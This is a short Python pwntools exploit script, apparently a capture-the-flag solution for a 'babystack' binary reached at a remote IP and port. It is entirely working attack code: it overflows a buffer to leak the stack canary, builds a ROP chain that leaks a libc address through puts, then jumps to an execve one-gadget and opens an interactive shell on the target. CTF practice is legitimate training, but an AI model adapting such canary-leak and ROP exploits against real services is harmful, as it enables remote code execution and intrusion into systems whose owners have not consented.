from pwn import *

context.log_level = 'DEBUG'
context.arch = 'amd64'

# p = process('../file/babystack')
p = remote('61.147.171.105', '54066')

input('continue')

# 服务器上没有/bin/sh文件，这个方法不行，需要execve('/bin/sh')
libc_binsh_offset = 0x000000000018cd17
system_offset = 0x0000000000045390

pop_rdi_ret = 0x0000000000400a93
put_plt = 0x0000000000400690
put_got = 0x0000000000600fa8
libc_put_offset = 0x000000000006f690
main_addr = 0x00400720
libc_execve_offset = 0x45216

payload = b'a' * 0x88

p.sendlineafter(b'>> ', b'1')
p.sendline(payload)
p.sendlineafter(b'>> ', b'2')

p.recvuntil(b'\n')
canary = u64(b'\0' + p.recv(7))
print(hex(canary))

payload = flat(
    b'a' * 0x88,
    canary,
    0,
    pop_rdi_ret,
    put_got,
    put_plt,
    main_addr,
)
p.sendlineafter(b'>> ', b'1')
p.sendline(payload)
p.sendlineafter(b'>> ', b'3')

libc_put_addr = u64(p.recvuntil(b'\n', drop=True).ljust(8, b'\0'))
libc_base_addr = libc_put_addr - libc_put_offset

payload = flat(
    b'a' * 0x88,
    canary,
    0,
    libc_execve_offset + libc_base_addr
)
p.sendlineafter(b'>> ', b'1')
p.sendline(payload)
p.sendlineafter(b'>> ', b'3')

p.interactive()